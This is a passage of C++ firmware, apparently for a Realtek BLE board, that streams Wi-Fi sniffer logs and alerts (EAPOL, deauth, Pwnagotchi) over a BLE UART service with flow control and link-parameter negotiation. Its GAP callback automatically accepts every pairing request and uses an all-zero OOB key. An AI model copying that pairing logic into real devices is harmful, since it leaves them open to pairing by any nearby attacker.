      seqBuf[0] = (char)c;
      seqLen = 1;
    } else {
      size_t utf8Len = validUtf8CharLen(&data[i], srcLen - i);
      if (utf8Len > 0 && utf8Len <= 4) {
        memcpy(seqBuf, &data[i], utf8Len);
        seqLen = utf8Len;
        consume = utf8Len;
      } else {
        seqBuf[0] = '?';
        seqLen = 1;
        consume = 1;
      }
    }

    if (pos + seqLen > cap) {
      truncated = true;
      break;
    }
    memcpy(out + pos, seqBuf, seqLen);
    pos += seqLen;
    if (pos + ellLen <= cap) {
      lastEllipsisCut = pos;
    }
    i += consume;
  }

  if (truncated && ellLen > 0) {
    pos = lastEllipsisCut;
    memcpy(out + pos, ellipsis, ellLen);
    pos += ellLen;
  }
  out[pos] = '\0';
  return pos;
}

size_t jsonEscapeToBuf(const char *src, char *out, size_t outSize) {
  return jsonEscapeTruncatedToBuf(src, out, outSize, (size_t)-1, "");
}

void getBleStateSafe(uint8_t &connIdOut, bool &notifyOut) {
  rtw_enter_critical(NULL, NULL);
  connIdOut = activeConnId;
  notifyOut = bleNotifyEnabled;
  rtw_exit_critical(NULL, NULL);
}

bool isBleReadyToNotifySafe(uint8_t &connIdOut) {
  bool notifySnap = false;
  rtw_enter_critical(NULL, NULL);
  connIdOut = activeConnId;
  notifySnap = bleNotifyEnabled;
  rtw_exit_critical(NULL, NULL);
  return (bleStarted && notifySnap && BLE.connected(connIdOut));
}

bool isBleConnectedSafe() {
  if (!bleStarted) return false;
  uint8_t connIdSnap = 0;
  rtw_enter_critical(NULL, NULL);
  connIdSnap = activeConnId;
  rtw_exit_critical(NULL, NULL);
  return BLE.connected(connIdSnap);
}

uint16_t getEffectiveBleAttMtu(uint8_t connId) {
  uint16_t mtuSize = 23;
  if (le_get_conn_param(GAP_PARAM_CONN_MTU_SIZE, &mtuSize, connId) != GAP_CAUSE_SUCCESS || mtuSize < 23) {
    return 23;
  }
  return mtuSize;
}

static bool hasBleTxCreditHeadroom(uint8_t connId, uint16_t minCredits, uint16_t maxWaitMs) {
  static uint16_t maxSeenCredits = 0;
  unsigned long waitStart = millis();
  while (true) {
    uint8_t curConn = 0;
    bool notifySnap = false;
    getBleStateSafe(curConn, notifySnap);
    if (!notifySnap || curConn != connId || !BLE.connected(connId)) {
      return false;
    }
    uint16_t remainCredits = 0;
    if (le_get_gap_param(GAP_PARAM_LE_REMAIN_CREDITS, &remainCredits) != GAP_CAUSE_SUCCESS) {
      return true;
    }
    if (remainCredits > maxSeenCredits) {
      maxSeenCredits = remainCredits;
    }
    uint16_t effectiveMin = minCredits;
    if (maxSeenCredits > 0) {
      if (maxSeenCredits <= 2 && effectiveMin > 1) {
        effectiveMin = 1;
      } else if (maxSeenCredits >= 3 && effectiveMin >= maxSeenCredits) {
        effectiveMin = (uint16_t)(maxSeenCredits - 1);
      }
    }
    if (remainCredits >= effectiveMin) {
      return true;
    }
    if (maxWaitMs == 0 || (millis() - waitStart >= maxWaitMs)) {
      return false;
    }
    vTaskDelay(1);
  }
}

void resetBleLogFlowControl() {
  bleLogBackoffMs = BLE_SNIFF_BASE_INTERVAL_MS;
  lastBleRoutineLogMs = 0;
  lastBlePriorityLogMs = 0;
  rtw_enter_critical(NULL, NULL);
  bleDroppedLogCount = 0;
  rtw_exit_critical(NULL, NULL);
}

bool waitForBleTxCredit(uint8_t connId) {
  return hasBleTxCreditHeadroom(connId, 1, 8);
}

bool bleSendLineCstr(const char *line, size_t lineLen, bool critical, bool isHeartbeat, uint16_t minCreditsOverride) {
  if (!line) return false;
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) return false;

  // 2A + P0-2 流控：普通抓包日志预留充足 TX credit 余量以防挤死 st 心跳与 LL 监督；关键/高优先级帧用低门槛快速通告
  uint16_t minCredits = (minCreditsOverride > 0) ? minCreditsOverride : ((!critical && !isHeartbeat) ? 2 : 1);
  uint16_t waitMs = critical ? 8 : 0;

  uint16_t attMtu = getEffectiveBleAttMtu(connId);
  size_t mtuCap = (attMtu > 3) ? (size_t)(attMtu - 3) : 20;
  size_t bufCap = (size_t)BleTx.getBufferLen();
  if (bufCap == 0) bufCap = 20;
  size_t maxChunk = (mtuCap < bufCap) ? mtuCap : bufCap;
  if (maxChunk == 0) maxChunk = 20;

  static char txScratch[384];
  bool useScratch = (lineLen + 1 <= sizeof(txScratch));
  if (useScratch) {
    memcpy(txScratch, line, lineLen);
    txScratch[lineLen] = '\n';
  }
  size_t total = useScratch ? (lineLen + 1) : lineLen;
  size_t offset = 0;

  while (offset < total) {
    if (!hasBleTxCreditHeadroom(connId, minCredits, waitMs)) {
      return false;
    }
    size_t chunkLen = total - offset;
    if (chunkLen > maxChunk) chunkLen = maxChunk;

    uint8_t *chunkPtr = nullptr;
    if (useScratch) {
      chunkPtr = (uint8_t *)(txScratch + offset);
    } else {
      static uint8_t fallbackChunk[248];
      if (chunkLen > sizeof(fallbackChunk)) chunkLen = sizeof(fallbackChunk);
      memcpy(fallbackChunk, line + offset, chunkLen);
      chunkPtr = fallbackChunk;
    }
    if (!BleTx.setData(chunkPtr, (uint16_t)chunkLen)) {
      Serial.println("[BLE] BleTx.setData failed");
      return false;
    }
    BleTx.notify(connId);
    offset += chunkLen;
    if (offset < total) {
      feedWatchdog();
      vTaskDelay(1);
    }
  }

  if (!useScratch) {
    if (!hasBleTxCreditHeadroom(connId, minCredits, waitMs)) {
      return false;
    }
    uint8_t nl = '\n';
    if (!BleTx.setData(&nl, 1)) return false;
    BleTx.notify(connId);
  }
  return true;
}

void bleSendLine(const String &line) {
  bleSendLineCstr(line.c_str(), line.length(), true, false, 0);
}

bool bleSendSniffLog(const char *msg, bool highPriority) {
  if (!msg || msg[0] == '\0') return true;
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) return false;
  char esc[240];
  jsonEscapeTruncatedToBuf(msg, esc, sizeof(esc), 180, "...");
  char line[280];
  int n = snprintf(line, sizeof(line), "{\"t\":\"log\",\"m\":\"%s\"}", esc);
  if (n <= 0 || (size_t)n >= sizeof(line)) return false;
  // Routine logs require >=3 free credits (auto-capped on smaller pools) to leave headroom for heartbeat/control;
  // high-priority security alerts (EAPOL/Deauth/Disassoc/Pwnagotchi) require >=1 credit.
  uint16_t minCredits = highPriority ? 1 : 3;
  return bleSendLineCstr(line, (size_t)n, false, highPriority, minCredits);
}

void bleSendLog(const char *msg) {
  if (!msg || msg[0] == '\0') return;
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) return;
  if (!bleSendSniffLog(msg, false)) {
    rtw_enter_critical(NULL, NULL);
    bleDroppedLogCount++;
    rtw_exit_critical(NULL, NULL);
  }
}

void bleSendLog(const String &msg) {
  bleSendLog(msg.c_str());
}

void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
  if (!chr) return;
  uint16_t rawLen = chr->getDataLen();
  const uint8_t *rawBuf = chr->getDataBuff();
  rtw_enter_critical(NULL, NULL);
  activeConnId = connID;
  rtw_exit_critical(NULL, NULL);
  if (!rawBuf || rawLen == 0) return;

  // #7：BLE_Peripheral_Task 栈仅 1024B，严禁调用 readString()；使用 static 缓冲安全裁剪
  uint16_t start = 0;
  while (start < rawLen && (rawBuf[start] == ' ' || rawBuf[start] == '\t' || rawBuf[start] == '\r' || rawBuf[start] == '\n')) {
    start++;
  }
  uint16_t end = rawLen;
  while (end > start && (rawBuf[end - 1] == ' ' || rawBuf[end - 1] == '\t' || rawBuf[end - 1] == '\r' || rawBuf[end - 1] == '\n')) {
    end--;
  }
  uint16_t trimmedLen = end - start;
  if (trimmedLen == 0) return;
  if (trimmedLen >= BLE_BUF_SIZE) {
    rtw_enter_critical(NULL, NULL);
    bleCmdOversizeDrop = true;
    rtw_exit_critical(NULL, NULL);
    return;
  }

  static char rxScratch[BLE_BUF_SIZE];
  memcpy(rxScratch, rawBuf + start, trimmedLen);
  rxScratch[trimmedLen] = '\0';

  if (isStopCmdCstr(rxScratch)) {
    rtw_enter_critical(NULL, NULL);
    emergencyStopRequested = true;
    priorityStopPending = true;
    cmdHead = cmdTail;  // 急停清空此前排队的未消费 BLE 指令
    rtw_exit_critical(NULL, NULL);
    return;
  }

  rtw_enter_critical(NULL, NULL);
  uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
  if (next != cmdTail) {
    memcpy(cmdRing[cmdHead], rxScratch, trimmedLen + 1);
    cmdHead = next;  // only advance the ring, never block the BLE task
  } else {
    bleCmdQueueOverflow = true;
  }
  rtw_exit_critical(NULL, NULL);
}

void bleNotifCB(BLECharacteristic* /*chr*/, uint8_t connID, uint16_t cccd) {
  bool enabled = ((cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY) != 0);
  rtw_enter_critical(NULL, NULL);
  activeConnId = connID;
  bleNotifyEnabled = enabled;
  rtw_exit_critical(NULL, NULL);
}

// 1-OptB GAP App 回调（运行在 1024B 栈的 BLE_Peripheral_Task 中：严禁大栈变量/Serial/String）
static T_APP_RESULT appGapCallback(uint8_t cb_type, void *p_cb_data) {
  T_APP_RESULT result = APP_RESULT_SUCCESS;
  if (!p_cb_data) return result;
  T_LE_CB_DATA cb_data;
  memcpy(&cb_data, p_cb_data, sizeof(T_LE_CB_DATA));

  switch (cb_type) {
    case GAP_MSG_LE_GAP_STATE_MSG: {
      T_IO_MSG *p_gap_msg = (T_IO_MSG *)cb_data.p_gap_state_msg;
      if (!p_gap_msg) break;
      T_LE_GAP_MSG gap_msg;
      memset(&gap_msg, 0, sizeof(gap_msg));
      memcpy(&gap_msg, &p_gap_msg->u.param, sizeof(p_gap_msg->u.param));

      switch (p_gap_msg->subtype) {
        case GAP_MSG_LE_DEV_STATE_CHANGE: {
          T_GAP_DEV_STATE ns = gap_msg.msg_data.gap_dev_state_change.new_state;
          if (ns.gap_init_state == GAP_INIT_STATE_STACK_READY &&
              ns.gap_adv_state == GAP_ADV_STATE_IDLE &&
              ns.gap_conn_state == GAP_CONN_DEV_STATE_IDLE &&
              !bleAdvUpdateInProgress &&
              bleGapConnState == GAP_CONN_STATE_DISCONNECTED) {
            le_adv_start();
          }
          break;
        }
        case GAP_MSG_LE_CONN_STATE_CHANGE: {
          uint8_t cid = gap_msg.msg_data.gap_conn_state_change.conn_id;
          T_GAP_CONN_STATE newState = (T_GAP_CONN_STATE)gap_msg.msg_data.gap_conn_state_change.new_state;
          uint16_t discCause = gap_msg.msg_data.gap_conn_state_change.disc_cause;
          bleGapConnState = newState;

          if (newState == GAP_CONN_STATE_DISCONNECTED) {
            rtw_enter_critical(NULL, NULL);
            if (cid == activeConnId) {
              bleNotifyEnabled = false;
            }
            bleGapDiag.discConnId = cid;
            bleGapDiag.discCause = discCause;
            bleGapDiag.negotiatePending = false;
            bleGapDiag.phyReassertDone = false;
            bleGapDiag.phyReassertAttempts = 0;
            bleGapDiag.lastPhyReqMs = 0;
            bleGapDiag.evDisconnected = true;
            rtw_exit_critical(NULL, NULL);
            if (!bleAdvUpdateInProgress) {
              le_adv_start();
            }
          } else if (newState == GAP_CONN_STATE_CONNECTED) {
            uint16_t ci = 0, cl = 0, ct = 0;
            uint8_t tp = 0, rp = 0;
            le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &ci, cid);
            le_get_conn_param(GAP_PARAM_CONN_LATENCY, &cl, cid);
            le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &ct, cid);
            le_get_conn_param(GAP_PARAM_CONN_TX_PHY_TYPE, &tp, cid);
            le_get_conn_param(GAP_PARAM_CONN_RX_PHY_TYPE, &rp, cid);

            rtw_enter_critical(NULL, NULL);
            activeConnId = cid;
            bleNotifyEnabled = false;
            bleGapDiag.connId = cid;
            bleGapDiag.initInterval = ci;
            bleGapDiag.initLatency = cl;
            bleGapDiag.initTimeout = ct;
            bleGapDiag.initTxPhy = tp;
            bleGapDiag.initRxPhy = rp;
            bleGapDiag.phyCause = 0;
            bleGapDiag.phyTx = tp;
            bleGapDiag.phyRx = rp;
            bleGapDiag.mtuSize = 23;
            bleGapDiag.negotiatePending = true;
            bleGapDiag.negotiateAttempts = 0;
            bleGapDiag.connectedAtMs = millis();
            bleGapDiag.lastNegotiateMs = 0;
            bleGapDiag.phyReassertDone = false;
            bleGapDiag.phyReassertAttempts = 0;
            bleGapDiag.lastPhyReqMs = 0;
            bleGapDiag.evConnected = true;
            rtw_exit_critical(NULL, NULL);

            // 1A: 连接建立后主动请求 1M PHY 提升灵敏度及 2.4GHz Wi-Fi 共存稳定性
            le_set_phy(cid, GAP_PHYS_PREFER_ALL, GAP_PHYS_PREFER_1M_BIT, GAP_PHYS_PREFER_1M_BIT, GAP_PHYS_OPTIONS_CODED_PREFER_NO);
          }
          break;
        }
        case GAP_MSG_LE_CONN_PARAM_UPDATE: {
          uint8_t cid = gap_msg.msg_data.gap_conn_param_update.conn_id;
          uint8_t status = gap_msg.msg_data.gap_conn_param_update.status;
          uint16_t cause = gap_msg.msg_data.gap_conn_param_update.cause;
          if (status == GAP_CONN_PARAM_UPDATE_STATUS_SUCCESS) {
            uint16_t ci = 0, cl = 0, ct = 0;
            le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &ci, cid);
            le_get_conn_param(GAP_PARAM_CONN_LATENCY, &cl, cid);
            le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &ct, cid);
            rtw_enter_critical(NULL, NULL);
            bleGapDiag.updInterval = ci;
            bleGapDiag.updLatency = cl;
            bleGapDiag.updTimeout = ct;
            bleGapDiag.evParamUpdated = true;
            rtw_exit_critical(NULL, NULL);
          } else if (status == GAP_CONN_PARAM_UPDATE_STATUS_FAIL) {
            rtw_enter_critical(NULL, NULL);
            bleGapDiag.paramFailCause = cause;
            bleGapDiag.evParamUpdateFailed = true;
            rtw_exit_critical(NULL, NULL);
          }
          break;
        }
        case GAP_MSG_LE_CONN_MTU_INFO: {
          rtw_enter_critical(NULL, NULL);
          bleGapDiag.mtuConnId = gap_msg.msg_data.gap_conn_mtu_info.conn_id;
          bleGapDiag.mtuSize = gap_msg.msg_data.gap_conn_mtu_info.mtu_size;
          bleGapDiag.evMtuUpdated = true;
          rtw_exit_critical(NULL, NULL);
          break;
        }
        case GAP_MSG_LE_BOND_PASSKEY_DISPLAY: {
          le_bond_passkey_display_confirm(gap_msg.msg_data.gap_bond_passkey_display.conn_id, GAP_CFM_CAUSE_ACCEPT);
          break;
        }
        case GAP_MSG_LE_BOND_PASSKEY_INPUT: {
          le_bond_passkey_input_confirm(gap_msg.msg_data.gap_bond_passkey_input.conn_id, 0, GAP_CFM_CAUSE_ACCEPT);
          break;
        }
        case GAP_MSG_LE_BOND_OOB_INPUT: {
          static uint8_t zeroOob[GAP_OOB_LEN] = {0};
          uint8_t cid = gap_msg.msg_data.gap_bond_oob_input.conn_id;
          le_bond_set_param(GAP_PARAM_BOND_OOB_DATA, GAP_OOB_LEN, zeroOob);
          le_bond_oob_input_confirm(cid, GAP_CFM_CAUSE_ACCEPT);
          break;
        }
        case GAP_MSG_LE_BOND_USER_CONFIRMATION: {
          le_bond_user_confirm(gap_msg.msg_data.gap_bond_user_conf.conn_id, GAP_CFM_CAUSE_ACCEPT);
          break;
        }
        case GAP_MSG_LE_BOND_JUST_WORK: {
          le_bond_just_work_confirm(gap_msg.msg_data.gap_bond_just_work_conf.conn_id, GAP_CFM_CAUSE_ACCEPT);
          break;
        }
        default:
          break;
      }
      break;
    }
    case GAP_MSG_LE_CONN_UPDATE_IND: {
      if (cb_data.p_le_conn_update_ind) {
        uint16_t cmin = cb_data.p_le_conn_update_ind->conn_interval_min;
        uint16_t cmax = cb_data.p_le_conn_update_ind->conn_interval_max;
        uint16_t clat = cb_data.p_le_conn_update_ind->conn_latency;
        uint16_t ctout = cb_data.p_le_conn_update_ind->supervision_timeout;
        // 1C: 拦截过紧的连接参数请求（interval < 30ms、supv_tout < 2000ms 或 latency > 10）
        bool reject = (cmin < 24 || ctout < 200 || clat > 10);
        result = reject ? APP_RESULT_REJECT : APP_RESULT_ACCEPT;
        rtw_enter_critical(NULL, NULL);
        bleGapDiag.indMin = cmin;
        bleGapDiag.indMax = cmax;
        bleGapDiag.indLat = clat;
        bleGapDiag.indTout = ctout;
        bleGapDiag.indRejected = reject;
        bleGapDiag.evConnUpdateInd = true;
        if (reject) {
          bleGapDiag.negotiatePending = true;
        }
        rtw_exit_critical(NULL, NULL);
      }
      break;
    }
    case GAP_MSG_LE_PHY_UPDATE_INFO: {
      if (cb_data.p_le_phy_update_info) {
        rtw_enter_critical(NULL, NULL);
        bleGapDiag.phyCause = cb_data.p_le_phy_update_info->cause;
        bleGapDiag.phyTx = (uint8_t)cb_data.p_le_phy_update_info->tx_phy;
        bleGapDiag.phyRx = (uint8_t)cb_data.p_le_phy_update_info->rx_phy;
        bleGapDiag.evPhyUpdated = true;
        rtw_exit_critical(NULL, NULL);
      }
      break;
    }
    default:
      break;
  }
  return result;
}

void processBleDiagAndNegotiation() {
  BleGapTelemetry snap;
  uint32_t droppedLogs = 0;
  unsigned long nowMs = millis();

  rtw_enter_critical(NULL, NULL);
  snap = bleGapDiag;
  bleGapDiag.evConnected = false;
  bleGapDiag.evDisconnected = false;
  bleGapDiag.evParamUpdated = false;
  bleGapDiag.evParamUpdateFailed = false;
  bleGapDiag.evPhyUpdated = false;
  bleGapDiag.evMtuUpdated = false;
  bleGapDiag.evConnUpdateInd = false;
  if (bleDroppedLogCount > 0 && (nowMs - lastBleDroppedWarnMs >= 5000)) {
    droppedLogs = bleDroppedLogCount;
    bleDroppedLogCount = 0;
    lastBleDroppedWarnMs = nowMs;
  }
  rtw_exit_critical(NULL, NULL);

  if (snap.evConnected) {
    char buf[128];
    snprintf(buf, sizeof(buf),
             "[BLE] Connected conn=%u int=%ums lat=%u tout=%ums phy=%u/%u",
             (unsigned)snap.connId,
             (unsigned)(snap.initInterval * 5U / 4U),
             (unsigned)snap.initLatency,
             (unsigned)(snap.initTimeout * 10U),
             (unsigned)snap.initTxPhy,
             (unsigned)snap.initRxPhy);
    Serial.println(buf);
  }
  if (snap.evDisconnected) {
    cancelBleScanPush();
    clearSniffLogRingSafe();
    resetBleLogFlowControl();
    char buf[80];
    snprintf(buf, sizeof(buf), "[BLE] Disconnected conn=%u disc_cause=0x%04X",
             (unsigned)snap.discConnId, (unsigned)snap.discCause);
    Serial.println(buf);
  }
  if (snap.evMtuUpdated) {
    char buf[64];
    snprintf(buf, sizeof(buf), "[BLE] ATT MTU=%u (conn=%u)",
             (unsigned)snap.mtuSize, (unsigned)snap.mtuConnId);
    Serial.println(buf);
  }
  if (snap.evPhyUpdated) {
    char buf[80];
    snprintf(buf, sizeof(buf), "[BLE] PHY updated cause=0x%04X tx=%u rx=%u",
             (unsigned)snap.phyCause, (unsigned)snap.phyTx, (unsigned)snap.phyRx);
    Serial.println(buf);
  }
  if (snap.evConnUpdateInd) {
    char buf[112];
    snprintf(buf, sizeof(buf),
             "[BLE] Peer ConnParamReq %u-%ums lat=%u tout=%ums -> %s",
             (unsigned)(snap.indMin * 5U / 4U),
             (unsigned)(snap.indMax * 5U / 4U),
             (unsigned)snap.indLat,
             (unsigned)(snap.indTout * 10U),
             snap.indRejected ? "REJECT" : "ACCEPT");
    Serial.println(buf);
  }
  if (snap.evParamUpdated) {
    char buf[96];
    snprintf(buf, sizeof(buf), "[BLE] ConnParam active int=%ums lat=%u tout=%ums",
             (unsigned)(snap.updInterval * 5U / 4U),
             (unsigned)snap.updLatency,
             (unsigned)(snap.updTimeout * 10U));
    Serial.println(buf);
  }
  if (snap.evParamUpdateFailed) {
    char buf[64];
    snprintf(buf, sizeof(buf), "[BLE] ConnParam update fail cause=0x%04X",
             (unsigned)snap.paramFailCause);
    Serial.println(buf);
  }
  if (droppedLogs > 0) {
    char buf[96];
    snprintf(buf, sizeof(buf), "[BLE] Dropped %lu non-critical log frames (TX congestion)",
             (unsigned long)droppedLogs);
    Serial.println(buf);
  }

  // 1C: 连接建立 1.5s 后（避开 Android 初始快速服务发现窗口）协商稳健容错连接参数
  if (snap.negotiatePending && BLE.connected(snap.connId) && (nowMs - snap.connectedAtMs >= 1500)) {
    uint16_t curInt = 0, curLat = 0, curTout = 0;
    le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &curInt, snap.connId);
    le_get_conn_param(GAP_PARAM_CONN_LATENCY, &curLat, snap.connId);
    le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &curTout, snap.connId);
    if (curInt >= 36 && curInt <= 72 && curLat >= 4 && curLat <= 6 && curTout >= 500) {
      rtw_enter_critical(NULL, NULL);
      bleGapDiag.negotiatePending = false;
      rtw_exit_critical(NULL, NULL);
    } else if (snap.negotiateAttempts < 2 &&
               (snap.lastNegotiateMs == 0 || (nowMs - snap.lastNegotiateMs >= 3000))) {
      // 目标: interval 45-90ms (36..72*1.25ms), latency 4, supv_tout 6000ms (600*10ms)
      uint16_t targetTout = (snap.negotiateAttempts == 0) ? 600 : 500;
      T_GAP_CAUSE cause = le_update_conn_param(snap.connId, 36, 72, 4, targetTout, 70, 142);
      rtw_enter_critical(NULL, NULL);
      bleGapDiag.negotiateAttempts++;
      bleGapDiag.lastNegotiateMs = nowMs;
      if (bleGapDiag.negotiateAttempts >= 2) {
        bleGapDiag.negotiatePending = false;
      }
      rtw_exit_critical(NULL, NULL);
      if (cause != GAP_CAUSE_SUCCESS) {
        Serial.print("[BLE] le_update_conn_param cause=");
        Serial.println((int)cause);
      }
    }
  }

  // P1-2: Bounded per-connection 1M PHY protection in main loop (NEVER inside 1024B BLE_Peripheral_Task).
  // Android 16 (Xiaomi) negotiates 1M initially, then proactively upgrades to 2M (tx=2 rx=2) for air efficiency.
  // Rationale & Risk Control:
  // - Never re-request inside GAP_MSG_LE_PHY_UPDATE_INFO: unbounded replies cause a 1M<->2M ping-pong loop
  //   that saturates LL control frames and risks LMP timeout (0x0122) or 0x0108 disconnects.
  // - Wait >= 2000ms post-connect and until ConnParam negotiation finishes so initial GATT/MTU discovery settles.
  // - Issue AT MOST 1 gentle 1M re-suggestion per connection (`phyReassertAttempts < 1`). If peer accepts 1M,
  //   we gain ~3-5dB link budget under 2.4GHz coex; if peer insists on 2M, we accept 2M cleanly without looping.
  if (!snap.negotiatePending &&
      !snap.phyReassertDone &&
      snap.phyReassertAttempts < 1 &&
      BLE.connected(snap.connId) &&
      (nowMs - snap.connectedAtMs >= 2000)) {
    uint8_t curTxPhy = 0, curRxPhy = 0;
    le_get_conn_param(GAP_PARAM_CONN_TX_PHY_TYPE, &curTxPhy, snap.connId);
    le_get_conn_param(GAP_PARAM_CONN_RX_PHY_TYPE, &curRxPhy, snap.connId);
    if (curTxPhy == GAP_PHYS_2M || curRxPhy == GAP_PHYS_2M) {
      T_GAP_CAUSE phyCause = le_set_phy(
          snap.connId,
          GAP_PHYS_PREFER_ALL,
          GAP_PHYS_PREFER_1M_BIT,
          GAP_PHYS_PREFER_1M_BIT,
          GAP_PHYS_OPTIONS_CODED_PREFER_NO);
      rtw_enter_critical(NULL, NULL);
      bleGapDiag.phyReassertAttempts++;
      bleGapDiag.phyReassertDone = true;
      bleGapDiag.lastPhyReqMs = nowMs;
      rtw_exit_critical(NULL, NULL);
      char buf[96];
      snprintf(buf, sizeof(buf),
               "[BLE] Post-handshake 1M PHY re-suggest (1/1) from tx=%u/rx=%u cause=%d",
               (unsigned)curTxPhy, (unsigned)curRxPhy, (int)phyCause);
      Serial.println(buf);
    }
  }
}

void ensureBleAdvertisingIfDisconnected() {
  static unsigned long lastAdvCheckMs = 0;
  if (!bleStarted || bleAdvUpdateInProgress) return;
  unsigned long nowMs = millis();
  if (nowMs - lastAdvCheckMs < 1500) return;
  lastAdvCheckMs = nowMs;

  if (isBleConnectedSafe()) return;
  T_GAP_DEV_STATE devState = {0, 0, 0, 0, 0};
  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
  if (devState.gap_init_state == GAP_INIT_STATE_STACK_READY &&
      devState.gap_adv_state == GAP_ADV_STATE_IDLE &&
      devState.gap_conn_state == GAP_CONN_DEV_STATE_IDLE) {
    le_adv_start();
    Serial.println("[BLE] Restarted idle advertising.");
  }
}

void updateBleName(const char *newName) {
  if (!newName || newName[0] == '\0') return;
  char nextName[sizeof(ble_name)];
  strncpy(nextName, newName, sizeof(nextName) - 1);
  nextName[sizeof(nextName) - 1] = '\0';
  if (strcmp(ble_name, nextName) == 0) {
    return;
  }
  strcpy(ble_name, nextName);
  if (!bleStarted) return;

  bleAdvUpdateInProgress = true;
  BLE.setDeviceName(String(ble_name));
  char gapName[GAP_DEVICE_NAME_LEN] = {0};
  strncpy(gapName, ble_name, GAP_DEVICE_NAME_LEN - 1);
  le_set_gap_param(GAP_PARAM_DEVICE_NAME, GAP_DEVICE_NAME_LEN, gapName);
  // 同步更新内置 GATT Device Name (0x2A00)，避免手机按 GATT 服务读取仍显示旧名
  gaps_set_parameter(GAPS_PARAM_DEVICE_NAME, (uint8_t)strlen(ble_name), (void *)ble_name);

  // AmebaD GAP (#14): 先标记更新边界并停广播等待进入 IDLE，防止断连回调与参数更新竞态
  T_GAP_DEV_STATE devState = {0, 0, 0, 0, 0};
  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
  bool wasAdvertising = (devState.gap_adv_state != GAP_ADV_STATE_IDLE);
  if (wasAdvertising) {
    le_adv_stop();
    unsigned long waitStart = millis();
    while (devState.gap_adv_state != GAP_ADV_STATE_IDLE && (millis() - waitStart < 300)) {
      feedWatchdog();
      delay(10);
      le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
    }
  }

  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->updateAdvertParams();
  uint8_t all_phys = GAP_PHYS_PREFER_ALL;
  uint8_t tx_phys = GAP_PHYS_PREFER_1M_BIT;
  uint8_t rx_phys = GAP_PHYS_PREFER_1M_BIT;
  le_set_gap_param(GAP_PARAM_DEFAULT_PHYS_PREFER, sizeof(all_phys), &all_phys);
  le_set_gap_param(GAP_PARAM_DEFAULT_TX_PHYS_PREFER, sizeof(tx_phys), &tx_phys);
  le_set_gap_param(GAP_PARAM_DEFAULT_RX_PHYS_PREFER, sizeof(rx_phys), &rx_phys);
  uint8_t slave_init_mtu_req = 1;
  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
  le_adv_update_param();
  delay(15);

  bleAdvUpdateInProgress = false;
  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
  if (!isBleConnectedSafe() &&
      devState.gap_adv_state == GAP_ADV_STATE_IDLE &&
      devState.gap_conn_state == GAP_CONN_DEV_STATE_IDLE) {
    le_adv_start();
  }
}

void setupBLE() {
  advdata.clear();
  advdata.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
  advdata.addCompleteName(ble_name);
  scndata.clear();
  scndata.addCompleteServices(BLEUUID(UART_SERVICE_UUID));

  BleRx.setWriteProperty(true);
  BleRx.setWriteNRProperty(true);
  BleRx.setWritePermissions(GATT_PERM_WRITE);
  BleRx.setWriteCallback(bleWriteCB);
  BleRx.setBufferLen(CHAR_VALUE_MAX_LEN);

  BleTx.setNotifyProperty(true);
  BleTx.setCCCDCallback(bleNotifCB);
  BleTx.setBufferLen(CHAR_VALUE_MAX_LEN);

  UartService.addCharacteristic(BleRx);
  UartService.addCharacteristic(BleTx);

  gap_config_max_mtu_size(247);
  BLE.init();
  BLE.setDeviceName(String(ble_name));
  BLE.configAdvert()->setAdvData(advdata);
  BLE.configAdvert()->setScanRspData(scndata);
  BLE.configServer(1);
  BLE.addService(UartService);
  BLE.beginPeripheral();
  feedWatchdog();

  // 1A: 显式锁定默认首选 1M PHY，提升接收灵敏度与 2.4GHz Wi-Fi 共存抗扰能力
  uint8_t all_phys = GAP_PHYS_PREFER_ALL;
  uint8_t tx_phys = GAP_PHYS_PREFER_1M_BIT;
  uint8_t rx_phys = GAP_PHYS_PREFER_1M_BIT;
  le_set_gap_param(GAP_PARAM_DEFAULT_PHYS_PREFER, sizeof(all_phys), &all_phys);
  le_set_gap_param(GAP_PARAM_DEFAULT_TX_PHYS_PREFER, sizeof(tx_phys), &tx_phys);
  le_set_gap_param(GAP_PARAM_DEFAULT_RX_PHYS_PREFER, sizeof(rx_phys), &rx_phys);

  // BLEAdvert::updateAdvertParams() 会在 beginPeripheral() 内重置 GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ=false，
  // 必须在 beginPeripheral() 之后显式重新开启从机主动 MTU 协商请求（最大 247B）。
  uint8_t slave_init_mtu_req = 1;
  le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);

  // 1-OptB: 通过合法 SDK 接口将 GAP 状态消息导流至 appGapCallback 以采集诊断并执行协商
  le_gap_msg_info_way(false);
  le_register_app_cb(appGapCallback);

  bleStarted = true;
  Serial.print("[INFO] BLE UART service started (");
  Serial.print(ble_name);
  Serial.println(")");
}

void cancelBleScanPush() {
  bleScanPush.reset();
}

void pumpBleScanPush() {
  if (!bleScanPush.active) return;
  uint8_t connId = 0;
  if (!isBleReadyToNotifySafe(connId)) {
    cancelBleScanPush();
    return;
  }
  unsigned long nowMs = millis();
  if (nowMs - bleScanPush.lastProgressAt > 8000) {
    Serial.println("[BLE] Aborted stalled scan result push.");
    cancelBleScanPush();
    return;
  }

  const uint8_t MAX_LINES_PER_TICK = 4;
  uint8_t sentCount = 0;
